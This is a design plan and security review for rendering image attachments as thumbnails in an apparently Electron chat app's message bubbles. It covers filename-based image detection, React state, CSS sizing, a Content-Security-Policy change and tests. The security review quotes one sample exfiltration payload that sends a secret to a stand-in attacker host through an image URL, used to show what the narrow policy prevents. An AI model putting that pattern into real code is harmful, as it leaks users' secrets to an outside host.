# #1045 — draw an image attachment as a thumbnail in the message bubble

## Files read

Codegraph is unavailable in this worktree (`codegraph_*` answers "CodeGraph not initialized" — a hard
error, not an empty result), so this list was built with Grep and Read. The gap is recorded here rather
than worked around silently.

- `src/renderer/src/screens/conversation/attachmentImageSource.ts` → `attachmentImageSources`,
  `AttachmentImageSourceOutcome`, `AttachmentImageSourceFailure` — #1044's merged surface. The entire API
  this slice consumes, and its header states the four contract facts the mount has to honour: the module
  singleton, the at-most-once outcome that may run synchronously, the release handle returned on every
  branch, and refcounted URLs where the last release revokes.
- `src/renderer/src/screens/conversation/ConversationScreen.tsx` → `BubbleAttachmentRow`, and the
  attachment map inside the `userMessage` arm — the branch point, and the header that records why the row
  is a direct child of `.bubble` with no wrapper, why the React key is the array index, and why the
  filename never reaches an attribute.
- `src/renderer/src/screens/conversation/attachmentExtensionLabel.ts` → `attachmentExtensionLabel` — the
  helper this slice must NOT reuse, and the source of the two constraints the new helper inherits: linear
  time with no backtracking pattern, and no sanitising or normalising of the name.
- `src/renderer/src/screens/conversation/conversation.css` → `.bubble`, `.bubble__file`, `.bubble__meta` —
  the box (`max-width: min(680px, 75%)`, `padding: var(--space-4) var(--space-5)`) and the rhythm
  mechanism: `margin-top: var(--space-3)` on the *following* sibling, which a thumbnail joins rather than
  duplicates. `.bubble`'s own rule records why it is deliberately not a flex column.
- `src/renderer/index.html` → the CSP meta tag — `default-src 'self'` with no `img-src`, the widening this
  slice owns.
- `src/main/index.ts` → the `webPreferences` block (`sandbox: true`, `contextIsolation: true`),
  `setWindowOpenHandler`, the `will-navigate` guard — the three defences that make an `img-src blob:`
  widening safe, all confirmed present and all untouched here.
- `src/renderer/src/store/threadTimeline.ts` → `MessageAttachment` (`{ attachmentId, filename }`) — the
  only two fields a bubble has, and the reason imageness can only be decided from the name.
- `src/shared/ipc/attachmentBytes.ts` → the header's "THE CHANNEL CARRIES BYTES AND NOTHING ELSE — no
  filename, no media type", which is why no type is available to dispatch on.
- `src/main/attachmentPath.ts` → `CANONICAL_ATTACHMENT_ID` = `/^[0-9a-f-]{1,64}$/`. ⭐ Load-bearing for the
  e2e spec: `attachment-file-row.spec.ts`'s ids (`e2e-download-1`) are NOT canonical, and that spec gets
  away with it only because it never drives a retrieval to storage. This slice does, so its fixture ids
  must be hex-and-hyphen or `storeAttachment` refuses and the bytes leg answers `unavailable`.
- `src/main/daemonConnection.ts` → the `attachment-chunk` routing arm — correlation is `Envelope.in_reply_to`
  against the `request_attachment` envelope's own `id`, with the payload `attachment_id` re-checked one
  layer down by the reassembler.
- `src/main/transport/attachmentReassembler.ts` → the declared-length and exact lowercase-hex SHA-256
  comparison, and `AttachmentFailReason`. The digest is computed over the whole file and must ride every
  chunk identically.
- `src/shared/wire/types.ts` → `AttachmentChunkPayload` (eight always-present fields),
  `ATTACHMENT_CHUNK_DATA_BYTES` = 45000 — every fixture below fits one chunk.
- `src/main/attachmentRetrieval.ts` → `ATTACHMENT_MAX_CONCURRENT_RETRIEVALS` (4) and the `inFlight`
  coalescing that makes a duplicate ask a total no-op.
- `e2e/attachment-file-row.spec.ts` → the seed-an-upload-then-send drive, `pushCompleted`, and the recorded
  reason it answers `request_attachment` with no frames. This slice reuses the drive and inverts that last
  decision.
- `e2e/fixtures/launchPairedApp.ts` → `seedConversationsFrame`, `SEEDED_ROW`, `LaunchPairedAppOptions`.
- `e2e/fixtures/bubbleText.ts` → `bubbleTextExactly`, the anchored whole-bubble matcher the new spec must
  not use.
- `e2e/composer-options-clamp.spec.ts` → the `app.evaluate(({ BrowserWindow }, size) => …setSize(…))`
  resize idiom, and its recorded rule that every geometry read after a resize must poll.
- `docs/knowledge/features/attachment-bytes.md`, `docs/knowledge/features/conversation-screen.md` — package
  overviews for the two areas touched.

## Design source

**Figma:** https://www.figma.com/design/g2HIq2UyPhslEoHRokQmHG?node-id=120-3848

A right-aligned user bubble on the app's navy ground: one line of title-small emphasized text, then a
160×160 image at `--radius-xs` (6px), then the meta row with its timestamp and copy glyph. The image sits
in a `Slot` (`I132:4567;132:4465`) at the bubble's own 20px horizontal padding, 12px clear of the text
above and the meta row below — the same 12px rhythm the bubble's other children already keep. The sample
is square and is drawn with `object-cover`; **both are properties of the sample, not the rule.** The
operator's 2026-08-22 sizing ruling governs instead: 160px tall, width from the image's own aspect ratio,
capped at the bubble's content width with the height falling proportionally, never cropped or stretched.
`object-cover` is therefore deliberately NOT transcribed — it is the one declaration that would crop.

## Context

#815 and #816 gave every attachment on a sent message the file row: an outlined document glyph, an
extension label and the filename, wrapped in a `<button>` that downloads. That includes images, which draw
today as a document with `PNG` stamped across it. #1044 landed the bytes-to-URL path and left it inert,
because the CSP has no `img-src` and nothing could load a `blob:` URL to prove a policy against.

This slice takes the slot over for images and widens the policy far enough to make the URL load. Three
things have to be decided here and nowhere else: **what counts as an image** (the window's only signal is
an untrusted filename), **how big the picture is drawn** (a live rule, not a computed constant), and
**what is drawn when there is no picture** (in flight, and terminally failed).

No ADR is warranted. The imageness decision is a one-consumer helper, the CSP widening's shape was already
settled by #1044's own security review, and the sizing rule is an operator ruling already recorded on the
ticket.

## Design

### 1. Imageness — `attachmentIsImage.ts` (new)

```ts
export function isImageAttachmentName(filename: string): boolean
```

The text after the **last** dot, lowercased, compared for **exact equality** against a frozen set. No
stripping, no capping, no normalising — that is the whole difference from `attachmentExtensionLabel`,
whose decorative uppercase-strip-cap pipeline classifies `photo.p-n-g` as `PNG` and `x.jpegg` as `JPEG`.

The set: `png`, `jpg`, `jpeg`, `gif`, `webp`, `avif`, `bmp`. Two exclusions are decisions rather than
omissions, and both are recorded in the module header:

- **`svg` is excluded.** It is the one candidate that is a *document* rather than bytes. Chromium disables
  scripting and external fetches for SVG in image mode, so this is not a live vector — but the argument
  for the CSP widening below is "a `blob:` URL only ever reaches an `<img>` `src`", and admitting a format
  whose safety depends on a second browser-internal rule weakens a policy that is otherwise one sentence.
  Nothing in this app produces an SVG attachment.
- **`heic`, `heif`, `tiff` are excluded** because Chromium cannot decode them. Excluding an undecodable
  format is strictly better for the reader than admitting it: an excluded name draws #815's file row,
  which is a working download control, where an admitted one would draw the textual fallback.

Linear time with no backtracking: `lastIndexOf` + `slice` + `toLowerCase` + a `Set.has`. Inherited from
`attachmentExtensionLabel`'s recorded constraint, because this too runs on an untrusted-length name on
every render.

It decides what is **drawn**, never what is fetched or from where. A name that lies produces a picture that
fails to decode (AC5), never a different file.

### 2. The mount — `BubbleAttachmentImage.tsx` (new)

Two exports, split so the whole drawn surface is provable under `renderToStaticMarkup`:

```ts
export type AttachmentThumbnailState =
  | { type: 'pending' }
  | { type: 'ready'; url: string }
  | { type: 'failed' }

export function AttachmentThumbnail(props: {
  state: AttachmentThumbnailState
  filename: string
}): JSX.Element | null                 // PURE — no hooks, no seams

export function BubbleAttachmentImage(props: { attachment: MessageAttachment }): JSX.Element | null
```

`AttachmentThumbnail` is a pure function of its state, which is what makes all three arms unit-testable in
a tier with no DOM and no effects. `BubbleAttachmentImage` owns exactly one `useState` and one `useEffect`
and renders `AttachmentThumbnail`; under static render it is always `pending`, so the container's own spec
proves only that arm and the pure component's spec proves all three.

**`failed` carries no reason, and that is structural rather than careful.** AC5 forbids a per-reason
message; collapsing the reason at the state boundary means there is no reason in scope to accidentally
render. `AttachmentImageSourceFailure` is read by the effect, logged as `console.error` with a bare event
name (it is a closed set of client-owned literals, so the reason itself is safe — but nothing about it
reaches the DOM), and discarded.

The three arms:

- **`pending` → `null`.** Nothing drawn, nothing reserved. Reserving space needs the aspect ratio, which
  needs the bytes, which is the thing being fetched — there is no honest box.
- **`ready` → `<img className="bubble__image" src={url} alt={IMAGE_ALT} />`.** `alt` is a **client-owned
  constant**, never the filename: `alt` is an attribute, and #815's ruling that the untrusted name does not
  enter one stands. An `<img>` needs an accessible name; a constant supplies one without reopening that
  question. `onError` flips the state to `failed` — the AC5 half where bytes arrive and do not decode.
- **`failed` →** a `<span className="bubble__image-fallback">` holding a client-owned sentence and, in its
  own `<span className="bubble__image-fallback-name">`, the filename as **escaped React children**. The
  name is included because a reader who sent several pictures needs to know which one is missing; AC5
  anticipates exactly this by bounding how it may reach the DOM.

The effect:

```
useEffect(() => attachmentImageSources.request(attachment.attachmentId, setStateFromOutcome),
          [attachment.attachmentId])
```

Returning the release handle directly as the cleanup is the shape #1044's contract asks for: the handle
comes back on every branch before any terminal, so it is callable unconditionally, and releasing on unmount
is load-bearing — a consumer that never releases leaks the URL for the window's lifetime. A synchronous
outcome (already-live URL) sets state from inside the effect body, which is legal and is the case #1044's
`takeShare` records the entry before calling `onOutcome` to make safe.

**No renderer-side queue and no main-side cap change.** `busy` from either leg is an ordinary terminal that
reaches `failed`. #1044 declined both as machinery for an unobserved failure mode; if this slice's e2e
measures routine `busy`, raising a cap is its own ticket.

### 3. The branch — `ConversationScreen.tsx`

The attachment map in the `userMessage` arm becomes a two-way branch on `isImageAttachmentName`, keyed by
array index exactly as today. Nothing else in the file moves: the rows stay direct children of `.bubble`,
written after the message text and before `<BubbleMeta>`, so `interactiveRoundtrip.test.tsx`'s pinned byte
string is untouched and `BubbleMeta` stays last. A message carrying one of each draws one of each, in
record order, because the map is unchanged apart from what each entry renders.

### 4. The box — `conversation.css`

```css
.bubble__image {
  margin-top: var(--space-3);
  display: block;
  max-height: 160px;
  max-width: 100%;
  border-radius: var(--radius-xs);
}
```

Five declarations, and the sizing rule is two of them. **`max-height` + `max-width` with both dimensions
left `auto` is CSS's own contain behaviour for a replaced element** (CSS2.1 §10.4): the used size is
computed from the intrinsic ratio, then each constraint clamps and the other dimension follows
proportionally. That is precisely the operator's ruling, including the assumption at its end:

- height ≥ 160 → clamped to 160, width from the ratio;
- that width over the content box → clamped to it, height falls proportionally;
- naturally shorter than 160 → neither clamp binds, natural size, **not scaled up**;
- never cropped, stretched or letterboxed, because no `object-fit` is declared and neither axis is fixed.

`height: 160px` was the rejected alternative and is a real trap: with a fixed height, `max-width` clamps
the width and leaves the height at 160, which *distorts* the image rather than scaling it.

**No fixed pixel width is written anywhere** (AC4). `max-width: 100%` resolves against `.bubble`'s content
box — `min(680px, 75%)` less 20px of padding either side — so it moves with the window live, and
`max-height` is a height. `display: block` removes the inline baseline gap an `<img>` would otherwise add.
`margin-top: var(--space-3)` joins the existing following-sibling rhythm, so text → picture → meta falls out
at 12px with no second mechanism; `.bubble__meta` already carries the same margin, which is the 12px below.

The fallback takes `.bubble__file`'s typographic block (body-small, `--color-inverse-primary`) and the same
`margin-top`, so a failed image occupies the rhythm a drawn one would.

### 5. The CSP — `src/renderer/index.html`

```
default-src 'self'; script-src 'self'; img-src 'self' blob:; style-src 'self' 'unsafe-inline'; base-uri 'none'; object-src 'none'
```

One directive added, and its shape was settled by #1044's security review rather than chosen here:
**`img-src` only, and only far enough for the `blob:` form.** `'self'` is restated because a present
`img-src` replaces `default-src` for images entirely — dropping it would break any same-origin image the
app later adds. `data:` is deliberately absent: nothing in this path mints one. `frame-src`, `child-src`
and a relaxed `default-src` are the three that would reopen the navigate-to-a-blob-of-HTML vector, and none
is touched; `object-src 'none'` stays.

## State + concurrency model

No store slice is added. The thumbnail's state is component-local `useState` in `BubbleAttachmentImage`,
because it describes one mounted picture and nothing else reads it — the store holds durable timeline
content, and a per-mount fetch status is not that. The shared state that does exist is #1044's refcounted
URL map, owned entirely by the module singleton.

The async task is one `attachmentImageSources.request` per mounted image attachment. Its cancellation path
is the release handle returned as the `useEffect` cleanup — the only teardown, and the one that decrements
the refcount and revokes the URL when the last holder lets go. Unmount happens on conversation switch,
thread remount and window teardown, all of which run React cleanup.

The effect's dependency is `attachment.attachmentId` alone. The record is frozen at send, so this never
changes for a given mount in practice; depending on the id rather than the object keeps it that way if a
future reducer ever re-creates the record.

Concurrency the design inherits rather than manages: both legs cap at 4, the retrieval leg coalesces a
duplicate ask for an id already in flight into one pushed event while the bytes leg does not, and #1044's
mint-or-join block is synchronous check-then-act that is sound under run-to-completion. None of that is
re-implemented or worked around here.

## Error handling

| Where | Failure | Result type | What the reader sees |
|---|---|---|---|
| Either leg | `AttachmentImageSourceFailure` (`refused`, `unavailable`, `busy`, `not-found`, …) | `{ type: 'failed'; reason }` from #1044 | The textual fallback, one client-owned sentence |
| `<img>` decode | bytes arrive, the name lied | `onError` → local `failed` | The same fallback |
| In flight | not yet terminal | `{ type: 'pending' }` | Nothing |

Every non-drawable path converges on one arm and one string. The host's `not-found` is its single code for
every request that yields no bytes, made indistinguishable on purpose so the verb cannot become a
path-existence oracle; a per-code message would undo that from this side, which is why the reason is
dropped at the state boundary rather than mapped.

Logging: one `console.error` with a static event name on the failed terminal. The reason literal is safe by
type but is not needed in the line, and the URL — a capability handle to the file's bytes — never reaches a
log, an attribute other than `src`, a cache key or a lookup path.

## Testing strategy

**Vitest, `environment: 'node'`, static renders:**

- `attachmentIsImage.test.ts` — the exact-comparison rule and each decision it encodes: last dot;
  `photo.p-n-g` and `x.jpegg` are **not** images where `attachmentExtensionLabel` would call them `PNG` and
  `JPEG` (the two cases that justify the module existing); case-insensitivity via `.PNG`; every admitted
  extension; `svg` and `heic` refused; no dot, trailing dot, and a bare `.png` name.
- `BubbleAttachmentImage.test.tsx` — `AttachmentThumbnail` rendered directly in each of the three states:
  `pending` draws nothing; `ready` draws exactly one `<img class="bubble__image">` whose `src` is the URL
  and whose `alt` is the constant, with the filename absent from the markup; `failed` draws the fallback
  with the name as escaped children, and a name carrying `<script>` and `"` renders as visible characters.
  Plus: the container renders nothing under static render (the `pending` arm).
- `ConversationScreen.test.tsx` (extended) — an image attachment draws no `.bubble__file`; a non-image one
  draws the row unchanged; a message with both draws one of each in record order, still between the message
  text and `.bubble__meta`.

**Playwright, `npm run e2e` — a new `e2e/attachment-image-thumbnail.spec.ts`:**

The end-to-end half of AC1 and all of AC3, AC4 and AC5. It drives the fetch **to completion**, which is the
decision `attachment-file-row.spec.ts` deliberately inverted: that spec answered `request_attachment` with
no frames because #816's next step was a save into the operator's real Downloads folder. This slice has no
save, so completion is safe and is the only way real bytes reach an `<img>`.

- `buildReplyFrames` answers a `request_attachment` with one `attachment_chunk` frame per fixture:
  `in_reply_to` = the request envelope's own `id`, `index: 0`, `total_chunks: 1`, `size` and `sha256`
  computed over the fixture bytes at spec time with `node:crypto` (a hand-written digest fails closed as
  `verification-failed`), `data` as padded base64. Every fixture is well under `ATTACHMENT_CHUNK_DATA_BYTES`.
- ⭐ **Fixture attachment ids are canonical** — hex and hyphen only, per `CANONICAL_ATTACHMENT_ID`. The
  sibling spec's `e2e-download-1` shape would be refused by `resolveAttachmentPath` and the bytes leg would
  answer `unavailable`, turning every picture into the fallback.
- Four seeded PNGs, generated as solid-colour images and embedded as base64 literals: **200×400** (portrait,
  never capped — proves 160-tall with the width from the ratio), **800×100** (ratio 8, so a 160-tall width
  of 1280 exceeds the content box at every window size up to a 680px bubble — proves the cap and the
  proportional height), **40×40** (proves no upscale), and a **liar**: ASCII bytes under a `.png` name
  (proves the decode-error fallback).
- Assertions are **relative to a measured content box**, never to a computed constant, so AC4 is proven by
  construction: read `.bubble`'s box and its computed inline padding, then assert the drawn width against
  it. Re-run at 800px (the app's `minWidth`) and at a wide size via the `setSize` idiom, polling after each
  resize.
- One message carries an image **and** a `.pdf`, asserting one `.bubble__image` and one `.bubble__file` in
  record order — AC1's "a message carrying both".
- AC2 as geometry: 12px from the text above, 12px to the meta row below, left edge at the bubble's own
  inline padding, `border-radius` 6px.
- Rounded deltas are normalised with `+ 0` before any `toBe(0)`, and the epsilon idiom follows the sibling
  spec's 1.5px.

**The bubble-text sweep, run before designing the children** (both greps, no tier filter):
`toHaveText|toContainText` — 148 sites, of which the bubble-scoped ones are six `bubbleTextExactly` callers
plus `attachment-file-row.spec.ts`'s two scoped reads inside `.bubble__file`.
`textContent|allTextContents|innerText` — 29 sites; the `real-*` ones read **assistant** bubbles, and that
tier never produces an attachment at all. Conclusion: **no existing site reddens.** The `<img>` bears no
text, and the only text-bearing child this slice adds is the fallback, which appears solely on a failed
image — a state no current spec can reach. The new spec uses scoped locators throughout and **does not use
`bubbleTextExactly`**, per that helper's own hazard note.

## Open questions

1. **Does `max-height` + `max-width` contain correctly in Chromium for a `blob:`-sourced `<img>` with no
   intrinsic-size attributes?** The spec text says yes; the e2e width/height assertions are what actually
   settle it. Resolution recorded in `## Revisions` if the answer forces `aspect-ratio` or a wrapper.
2. **Does the fallback want the filename at all?** Included above; if the e2e shows the name dominating a
   narrow bubble, the alternative is the constant alone. Either way AC5's escaping bound is unchanged.
3. **Is `bmp`/`avif` worth admitting?** Both decode in Chromium and neither costs anything; kept unless the
   set proves awkward to test.

## Size

Re-counted against this written plan. Production source files (`*.ts`/`*.tsx` under `src/`, excluding
tests): `attachmentIsImage.ts`, `BubbleAttachmentImage.tsx`, `ConversationScreen.tsx` — **3**, plus
`conversation.css` and `index.html` which the file count does not score. New exports: `isImageAttachmentName`,
`AttachmentThumbnail`, `BubbleAttachmentImage`, `AttachmentThumbnailState` — **4**. Consumer call sites
needing simultaneous update: **1**. Acceptance criteria: **5**. Reject branches: **3**.

Total written work is estimated at ~1600 lines, **over the 800-line ceiling, and stated rather than
resolved.** #1045 is a grandchild of #691 via #868, so the split-depth gate forbids a further split; the
refiner already applied `needs-human:sizing` and recorded the declined split on the ticket. The floor rule
reaches the same answer independently: `isImageAttachmentName` has exactly one consumer, and a CSP widening
is only provable where something loads, so neither half is verifiable alone. Building as one ticket.

## Revisions

**2026-09-04 — the three Open Questions, resolved in Phase B. None changed the design.**

1. **Does `max-height` + `max-width` contain correctly in Chromium for a `blob:`-sourced `<img>` with no
   intrinsic-size attributes?** **Yes, measured.** `e2e/attachment-image-thumbnail.spec.ts` asserts the
   uncapped case (200×400 draws 80×160), the capped case (800×100 draws at the bubble's measured content
   width with the height at width÷8), and the not-scaled-up case (40×40 draws 40×40), all against a live
   content box across two window sizes. No `aspect-ratio` and no wrapper element were needed.
   The rejected `height: 160px` alternative was **mutation-tested rather than argued**: substituting it
   reddens the capped assertion with a drawn height of 160 against an expected 57 — the distortion the
   plan predicted, confirmed to be detected.
2. **Does the fallback want the filename?** **Kept**, as planned. It draws on its own line
   (`.bubble__image-fallback-name` is `display: block`) so a long name wraps under the client-owned
   sentence instead of pushing it, and `word-break: break-word` inherits from `.bubble`, so no new
   overflow mechanism was needed.
3. **Are `bmp`/`avif` worth admitting?** **Kept.** Both decode in Chromium, neither cost anything, and
   `attachmentIsImage.test.ts` covers the whole set uniformly.

**One measurement worth carrying forward, recorded because it corrects a plausible assumption rather than
this plan's design.** The CSP's detector is not what it looks like. Reverting `img-src 'self' blob:` fails
the e2e spec at `toHaveCount(1)` on `img.bubble__image` — received 0 — not at a `naturalWidth` read: a
source the policy refuses raises `error` on the `<img>`, the same signal an undecodable byte stream raises,
so the element unmounts into the fallback and there is no `<img>` left to measure. A spec that had asserted
only `naturalWidth > 0` would have thrown a locator error rather than a clean failure, and one that
asserted only "the fallback is absent" would have been the right shape by accident.

## Security review

**Verdict:** PASS

**Findings:**

- **[Trust boundaries]** No findings. Two untrusted values cross into this design and each has one named
  sink. `MessageAttachment.filename` — operator- or model-chosen — reaches exactly two places:
  `isImageAttachmentName`, which only ever compares it against client-owned literals and returns a boolean,
  and the fallback's `<span>` as escaped React children. It reaches **no attribute**: `alt` is a
  client-owned constant precisely so #815's ruling (the name never enters an attribute) is not reopened,
  and the React key stays the array index rather than becoming name-derived. `AttachmentImageSourceFailure`
  is a closed set of literals written in this repo (safe by type, not by care) and is discarded at the state
  boundary rather than rendered, which makes AC5's "never a per-reason message" structural.
- **[Trust boundaries — the URL]** No findings. The `blob:` URL is a capability handle to the file's bytes
  within this origin. It reaches one place, an `<img>` `src`, and nothing else: not a log line, not a second
  attribute, not a cache key, not a lookup path. The failure log is a static event name with no
  interpolation. It carries no part of the attachment id (`URL.createObjectURL` mints a random UUID).
- **[Tokens, secrets]** Not applicable — no token, credential or key is read, written or derived. The blob
  URL is the only capability-like value and it is window-scoped, never persisted, and revoked by refcount
  on the last release.
- **[File / storage]** No findings, and no new path is constructed. `attachment.attachmentId` is passed to
  #1044's `request` unchanged and is gated main-side by `resolveAttachmentPath`'s `CANONICAL_ATTACHMENT_ID`
  before any filesystem call. No second sanitiser and no second escape check is added on this side — two
  divergent checks on one directory ends with one of them being weaker, which is
  `attachmentBytes.ts`'s own recorded ruling. The renderer never sees or builds a path.
- **[Electron attack surface — the CSP widening]** ⭐ The substance of this review, and no MUST FIX.
  `img-src 'self' blob:` **adds no network-reachable source.** It does not admit `https:`, `http:`, `data:`
  or `*`, so it does not open the classic `img-src` exfiltration channel (`new Image().src =
  'https://attacker/' + secret`) that a lazier widening would. The only URLs it admits are ones this window
  itself minted. The blob-of-HTML navigation vector is closed three times over and all three guards are
  confirmed present and untouched in `src/main/index.ts`: the `will-navigate` handler confines in-place
  navigation to the app's own document, `setWindowOpenHandler` denies every scheme and externalises only
  `http:`/`https:`, and `object-src 'none'` blocks a blob object. A fourth holds by fallback rather than by
  declaration and is the one to protect: there is no `frame-src` and no `child-src`, so frames inherit
  `default-src 'self'` and a `blob:` iframe is refused. **Adding `frame-src`, `child-src` or relaxing
  `default-src` would reopen exactly what `img-src` alone does not**, and none is touched.
- **[Electron attack surface — directive shadowing]** No finding, because the plan already answers it, but
  it is the trap worth recording: a present `img-src` **replaces** `default-src` for images entirely. Writing
  `img-src blob:` alone would silently break every same-origin image the app later adds, so `'self'` is
  restated. Availability rather than exploitability, and caught by design rather than by test.
- **[Electron attack surface — window config]** No findings. `sandbox: true` and `contextIsolation: true`
  are set on the only window and are untouched; no `BrowserWindow`, `webPreferences`, protocol handler or
  `contextBridge` API is added, changed or widened by this slice. The renderer gains no new capability — it
  consumes an existing one.
- **[Cryptographic primitives]** Not applicable to production code: nothing here hashes, signs, compares or
  generates randomness. The e2e fixture computes a SHA-256 with `node:crypto.createHash` over its own
  bytes, which is fixture *input* to the production verification in `attachmentReassembler` — that
  comparison, which is exact lowercase hex over the whole file and deliberately neither prefix- nor
  case-insensitive, is read and relied on, never re-implemented or relaxed.
- **[Network & I/O]** No findings, and no new network surface: the two legs, their caps, their deadlines
  and their teardown are #996's and #866's, consumed unchanged. Self-pressure is bounded rather than
  unbounded — both legs cap at 4 concurrent and answer `busy`, which reaches the reader as the fallback.
  The plan explicitly declines a renderer-side queue and declines to raise a main-side cap, per #1044.
- **[Errors, logs, telemetry]** No findings. One `console.error` with a static event name on the failed
  terminal. No filename, no attachment id, no URL, no reason string, no byte length and no path is
  interpolated into it. Nothing new reaches the diagnostic log, so #131's renderer pin on `DiagnosticEvent`
  is untouched.
- **[Concurrency]** No findings, and one non-obvious sequence verified rather than assumed. The single
  long-lived task per mount is cancelled by the release handle returned as the `useEffect` cleanup — the
  only teardown, and the one that decrements the refcount and revokes. Under React's development
  double-invoke (`React.StrictMode` wraps the tree in `src/renderer/src/main.tsx`) the sequence is
  request → release → request; the second ask finds `inFlight.has(attachmentId)` true in
  `createAttachmentRetrieval` and is a total no-op, **and the second mount still settles**, because main
  answers with `sender.send(ATTACHMENT_RETRIEVAL_EVENT_CHANNEL, …)` — a channel broadcast every renderer
  listener receives and filters by `attachmentId` — not a per-request reply. Release is idempotent, and
  #1044's `takeShare` records the map entry *before* running `onOutcome`, which is what makes a
  release-from-inside-the-callback safe. `onError` cannot loop: it moves the state off `ready`, which
  unmounts the `<img>` that raised it.
- **[Threat model — attacker-chosen bytes reach an image decoder]** ⭐ SHOULD FIX in the sense of "record
  it, do not try to fix it here". This is the one genuinely new exposure this slice creates and it is the
  point of the feature rather than a lapse: bytes the host returned are handed to Chromium's PNG/JPEG/GIF/
  WebP/AVIF/BMP decoders. Integrity is verified, authenticity is not — the same party supplies the bytes
  and the digest, as `AttachmentChunkPayload` already records — so a hostile or compromised host can choose
  what reaches the decoder. What bounds it: decoding happens in a renderer with `sandbox: true`,
  `contextIsolation: true` and no Node integration; the declared size is capped at
  `ATTACHMENT_MAX_RETRIEVAL_BYTES` before a byte is stored; the blob is minted with **no media type**, so
  nothing dispatches on an attacker-influenced type; and a decode failure is caught by `onError` and drawn
  as the fallback rather than surfacing. Excluding `svg` (a document, not bytes) and the formats Chromium
  cannot decode keeps the admitted decoder set to raster codecs. Accepted, not deferred — there is no
  version of "draw the picture" that does not decode the bytes.
- **[Threat model — renderer memory held by live blobs]** OUT OF SCOPE, named rather than ignored. Each
  `ready` thumbnail holds a blob backed by the whole file for as long as it is mounted, and the timeline is
  not virtualised, so a long thread of images holds one blob per mounted image (bounded per file by
  `ATTACHMENT_MAX_RETRIEVAL_BYTES`, unbounded in count by thread length). Refcounting means nothing leaks —
  every URL is revoked when its last holder unmounts — so this is a working-set characteristic, not a leak.
  Measuring it needs a long real thread of images, which does not exist until this slice ships. It belongs
  with the already-filed follow-up on a late-loading thumbnail moving the reader's scroll position, which
  is blocked on this ticket and is where thread-length behaviour gets looked at.
- **[Threat model — a lying filename]** No finding; it is AC5 by construction. Imageness is a client-owned
  decision over an untrusted name that decides only what is **drawn**, never what is fetched or from where.
  The identifier addresses the fetch and the name has no part in it, so a name that lies produces a picture
  that fails to decode and falls back — never a different file, and never a path.

**Reviewer:** builder (self-review per `builder/security-review.md`)
**Date:** 2026-09-04
